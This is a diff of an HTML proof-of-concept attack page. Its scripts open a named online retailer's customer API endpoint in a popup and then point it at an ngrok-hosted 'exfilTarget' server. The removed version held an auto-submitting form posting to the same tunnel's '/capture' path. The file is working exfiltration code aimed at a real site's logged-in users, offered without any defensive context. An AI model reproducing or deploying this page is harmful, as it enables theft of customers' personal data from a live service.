@@ -1,11 +1,21 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="POST" action="https://838d-2804-4580-1080-7db-f050-2160-a7bd-b583.ngrok-free.app/capture">
-        <input type="hidden" name="target" value="https://www.boozt.com/at/de-at/api/customer">
-    </form>
     <script>
-        document.getElementById("evilForm").submit();
+        const exfilTarget = "https://838d-2804-4580-1080-7db-f050-2160-a7bd-b583.ngrok-free.app/save";
+
+        // Abre um popup com o endpoint sensível
+        const win = window.open("https://www.boozt.com/at/de-at/api/customer");
+
+        // Aguarda o carregamento e redireciona
+        setTimeout(() => {
+            try {
+                // Agora redireciona o popup para seu servidor
+                win.location = exfilTarget;
+            } catch (e) {
+                console.error("Erro ao redirecionar:", e);
+            }
+        }, 3000); // dá tempo pro JSON ser carregado
     </script>
 </body>
 </html>
